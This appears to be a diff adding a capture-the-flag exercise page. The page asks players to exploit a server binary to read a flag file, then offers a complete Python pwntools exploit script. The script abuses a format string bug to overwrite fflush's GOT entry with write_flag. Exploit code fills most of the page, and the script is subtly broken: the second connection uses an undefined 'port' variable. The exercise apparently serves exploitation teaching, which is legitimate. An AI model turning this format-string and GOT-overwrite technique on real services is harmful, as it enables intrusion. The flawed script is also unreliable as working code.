@@ -1,0 +1,38 @@
+<h5> Original exercise </h5>
+
+<a href="<%= handout_url %>">This binary</a> is running on the server (port 60735). Exploit it to read the contents of the file called <code>flag</code> in the same directory. You might want to take advantage of the function named <code>write_flag</code>.
+
+<h5> An exploit </h5>
+
+You have also come across the following exploit script which someone else has
+used to solve this exercise. Use it as you see fit.
+
+<pre>
+#!/usr/bin/env python
+
+# format string vulnerability triggered when last message is printed for newly
+# connected user, exploit via GOT overwrite of fflush
+
+from pwn import *
+
+host = sys.argv[1]
+
+r0 = remote(host, 60735)
+
+address = 0x13020
+to_write = 0x11340
+
+r0.sendline("/nick "+p32(address))
+r0.sendline("%%%dd"%(to_write-5) + "%2$n")
+r0.recvuntil("> ")
+r1 = remote(host, port)
+r1.recvuntil("> ")
+r1.recvline()
+r1.close()
+
+r0.recvline()
+r0.sendline()
+print r0.recvuntil("Congrats"),
+print r0.recvline()
+r0.close()
+</pre>
